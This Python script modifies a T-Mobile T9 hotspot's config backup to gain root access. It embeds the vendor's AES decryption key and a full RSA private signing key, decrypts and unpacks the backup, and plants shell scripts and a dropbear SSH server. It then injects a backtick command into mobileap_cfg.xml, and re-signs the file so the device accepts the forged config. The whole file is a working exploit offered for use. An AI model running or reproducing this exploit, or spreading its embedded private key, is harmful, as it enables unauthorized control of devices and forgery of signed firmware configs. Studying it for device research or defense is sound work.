#!/usr/bin/env python3

# Created by Chris Blake (chrisrblake93@gmail.com)
# Please do not redistribute!

import argparse
import fileinput
import hashlib
import os
import pathlib
import re
import shutil
import sys
import tarfile
import tempfile

cfg_key = '877F03E31D1F7FD2B8A71B82F7B8AFBE'
cfg_key_iv = '6D6375E279BDCAD1'

cfg_signing_key = """-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDAYclEcrqWgklG
d8parcK2aoPvFptmRlBk6fHKNLRFLIpLnfO4yCBMITr2ycX24ZQc5qWhAlo+AXiw
ybUDTtAvCB19wjWqOrCab3mx/kD8a7BeVyzXBG6F219YO9uZZxCY7tRRotjShaWy
GOEyuxBg94Nei4AV4NUR97N4GlySTGxovML7jiwCl5mbyqbJOaa+LYC1qSG7LMDy
l80h+3CwsevtijM0k2LoMTwW1JLeL9MPSueC2gkgxwdvYsVw8POOxgZ1rdENHDI1
nPswOYw2aNfALPQFj56jpy0e7nkMxrRQeOZNGDe19lwY+a1FFbdrRhNickD1fFo+
XkcEAxyHAgEDAoIBAQCAQTDYTHxkVtuET9w8c9ckRwKfZGeZhDWYm/aGzc2Dcwbd
E/fQhWrda3ykhoP567gTRG5rVubUAPsghnis3zV0sBOpLCPG0csRn6Z2qYCoR8rp
j3M6AvRZPOo60pJmRLW7SeLhFzs3A8PMEJYh0grrT6zpslVj6zi2pSJQEZMMMcsD
q9bxBTOjTXZoPSK22V+IDpSyS6PGSEFbWWgKC64xEDmQssebZrUdFkykVyCfvYfh
WgvdnboJS54KJULk9u34Zm0lfp94BVll9AW0xJlnKprghm5kVFT3HrwlGXrEdUAa
j+IUTbSDBnOPzH0pLZYHEf8UEL13VqiFQRPxwrebAoGBAOD8+3X6458r0EtPvM9w
Vi4Quo2C6y2bKEzBDA7bj0QYxLCS5htHDKUI5jLPvYUG7Wqb7jEUitSHrHcKejCK
pboRzJMWwaRJDzLKEtdM4rqrElVBlkPTCc41vPuCGmgKvS861MTEkwZZj6dcGUex
l35ekC0EAYyDOOC/P1ZFbLaFAoGBANrmP4qXIr9h0xyvsiNGnWlhXRQnTH52mBIo
haI3WqdOVOUBl+yEbK4zqZZQlFznphyhVaSh4p2LKSNVsLCO2NSIX8+mrj2QBPlS
nBtUL+twlpotzQqcB1D7PBdlLdjbWaTtzE5qEKKX3QdlLanVudgCGufAV5g/QXy3
PVLT8lKbAoGBAJX9/PlR7RTH4DI1KIpK5B610bOsnMkSGt3WCAnntNgQgyBh7rza
CG4F7syKflivSPG9SXYNseMFHaSxpssHGSa2iGIPK8LbX3cxYeTd7HxyDDjWZC03
W97Off0BZvAHKMonOIMtt1mRCm+Su4UhD6mUYB4Cq7MCJesqKjmDnc8DAoGBAJHu
1QcPbH+WjL3KdsIvE5uWPg1viFRPEAwbA8F6PG+Jje4BD/MC8x7NG7mLDZNFGWhr
jm3BQb5cxheOdcsJ5eMFlTUZyX5gA1DhvWeNdUegZGbJM1xoBOCnfWTuHpCSO8NJ
Mt7xYGxlPgTuHnE5JpABZ0Uq5RAqK6h6KOHioYxnAoGAe6crFkluJUYHRlyWPsSf
LN6LE9jqjxi2U+uc7v1QqXGbwDHYpDoIpO4bBPuQyWFgNCMrFQgI/PPrkGkK2IdM
1zsP8ptl6gWhGZRiqAu+koRqEZG3F7Fzk9anc4xYiJHBB99b9xlg49S0ATMVnGxi
hj7gu6KxtimkPbCiTVpfpDs=
-----END PRIVATE KEY-----
"""

def main(file):
    # Can we access it?
    if not os.path.isfile(file):
        print(f"Unable to process {file}, please verify the file path.")
        sys.exit(1)
    elif not os.access(file, os.R_OK):
        print(f"Unable to read from {file}, please check file permissions.")
        sys.exit(1)

	# Get the path of where our tool is
    ourpath = pathlib.Path(__file__).parent.resolve()

    # Make sure we know where to save our new generated config
    cfgpath, _ = os.path.split(os.path.abspath(file))

    # Create a temp directory to work in
    tmpdir = tempfile.TemporaryDirectory()

    # Copy the config file
    shutil.copyfile(file, f"{tmpdir.name}/hotspot_cfg.bin")

    # Copy over our evil stuff
    shutil.copytree(f"{ourpath}/src",f"{tmpdir.name}/src")

    # Write out our private key for openssl to use
    with open(f"{tmpdir.name}/privkey.pem", 'w') as file:
        file.write(cfg_signing_key)

    # Strip off the validation since we don't care
    with open(f"{tmpdir.name}/hotspot_cfg.bin", 'rb') as fsrc:
        with open(f"{tmpdir.name}/hotspot_cfg.bin.stripped", 'wb+') as fdest:
            shutil.copyfileobj(fsrc, fdest)
            fdest.seek(-256, os.SEEK_END)
            fdest.truncate()
    os.remove(f"{tmpdir.name}/hotspot_cfg.bin")

    # Decrypt
    os.system(f"openssl enc -aes-256-cbc -d -in {tmpdir.name}/hotspot_cfg.bin.stripped -out {tmpdir.name}/hotspot_cfg_extract.tar -K {cfg_key} -iv {cfg_key_iv} -md sha256 2> /dev/null")
    os.remove(f"{tmpdir.name}/hotspot_cfg.bin.stripped")

    # Extract Layer 1
    os.mkdir(f"{tmpdir.name}/hotspot_cfg")
    hscfg1 = tarfile.open(f"{tmpdir.name}/hotspot_cfg_extract.tar")
    hscfg1.extractall(f"{tmpdir.name}/hotspot_cfg/")
    hscfg1.close()
    os.remove(f"{tmpdir.name}/hotspot_cfg_extract.tar")

    # Extract Layer 2
    os.mkdir(f"{tmpdir.name}/hotspot_cfg/hotspot_cfg")
    hscfg2 = tarfile.open(f"{tmpdir.name}/hotspot_cfg/hotspot_cfg.tar")
    hscfg2.extractall(f"{tmpdir.name}/hotspot_cfg/hotspot_cfg/")
    hscfg2.close()
    os.remove(f"{tmpdir.name}/hotspot_cfg/hotspot_cfg.tar")

    # Insert some evilness
    if not os.path.isdir(f"{tmpdir.name}/hotspot_cfg/hotspot_cfg/data/configs/pwn"):
        os.mkdir(f"{tmpdir.name}/hotspot_cfg/hotspot_cfg/data/configs/pwn")
    shutil.move(f"{tmpdir.name}/src/root.sh", f"{tmpdir.name}/hotspot_cfg/hotspot_cfg/data/configs/root.sh")
    os.chmod(f"{tmpdir.name}/hotspot_cfg/hotspot_cfg/data/configs/root.sh", 0o755)
    shutil.move(f"{tmpdir.name}/src/downgrade.sh", f"{tmpdir.name}/hotspot_cfg/hotspot_cfg/data/configs/pwn/downgrade.sh")
    os.chmod(f"{tmpdir.name}/hotspot_cfg/hotspot_cfg/data/configs/pwn/downgrade.sh", 0o755)
    shutil.move(f"{tmpdir.name}/src/dropbear", f"{tmpdir.name}/hotspot_cfg/hotspot_cfg/data/configs/pwn/dropbear.init")
    shutil.move(f"{tmpdir.name}/src/dropbearmulti", f"{tmpdir.name}/hotspot_cfg/hotspot_cfg/data/configs/pwn/dropbearmulti")
    os.system(f"sed -i 's|/data/misc/wifi/hostapd.conf|/data/misc/wifi/hostapd.conf`nohup /data/configs/root.sh`|g' {tmpdir.name}/hotspot_cfg/hotspot_cfg/data/configs/mobileap_cfg.xml")

    # Remove IMEI from config, it's ignored currently anyways
    os.system(f"sed -i 's|imei=.*|imei=000000000000000|g' {tmpdir.name}/hotspot_cfg/model ")

    # Package layer 2
    hscfg2 = tarfile.open(f"{tmpdir.name}/hotspot_cfg/hotspot_cfg.tar", "w:gz")
    hscfg2.add(f"{tmpdir.name}/hotspot_cfg/hotspot_cfg/data",arcname="data")
    hscfg2.close()
    shutil.rmtree(f"{tmpdir.name}/hotspot_cfg/hotspot_cfg/")

    # Update SHA256sum
    newhash = hashlib.sha256(open(f"{tmpdir.name}/hotspot_cfg/hotspot_cfg.tar", "rb").read()).hexdigest()
    with open(f"{tmpdir.name}/hotspot_cfg/hashfile", 'w') as f:
        f.write(f"hotspot_cfg.tar={newhash}")

    # Package layer 1
    hscfg1 = tarfile.open(f"{tmpdir.name}/hotspot_cfg.tar", "w:gz")
    for file in ["hashfile", "model", "hotspot_cfg.tar"]:
        hscfg1.add(f"{tmpdir.name}/hotspot_cfg/{file}",arcname=f"{file}")
    hscfg1.close()
    shutil.rmtree(f"{tmpdir.name}/hotspot_cfg/")

    # Encrypt
    os.system(f"openssl enc -aes-256-cbc -in {tmpdir.name}/hotspot_cfg.tar -out {tmpdir.name}/hotspot_cfg.bin.nosig -K {cfg_key} -iv {cfg_key_iv} -md sha256 2> /dev/null")
    os.remove(f"{tmpdir.name}/hotspot_cfg.tar")

    # Sign it
    os.system(f"openssl dgst -sha256 -sign {tmpdir.name}/privkey.pem -out {tmpdir.name}/conf_sig.bin {tmpdir.name}/hotspot_cfg.bin.nosig 2> /dev/null")

	# Merge our signing with the file
    with open(f"{tmpdir.name}/hotspot_cfg.bin", 'wb') as file:
        with open(F"{tmpdir.name}/hotspot_cfg.bin.nosig",'rb') as fi: file.write(fi.read())
        with open(F"{tmpdir.name}/conf_sig.bin",'rb') as fi: file.write(fi.read())

    # Copy it back to our main dir
    shutil.copyfile(f"{tmpdir.name}/hotspot_cfg.bin", f"{cfgpath}/hotspot_cfg_modified.bin")

    tmpdir.cleanup() # removes the temp dir

    print("Complete, upload hotspot_cfg_modified.bin to start the fun! Enjoy!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Modify a T-Mobile T9 config backup to do evil things.')
    parser.add_argument('file', help='The T9 config file')
    args = parser.parse_args()

    main(args.file)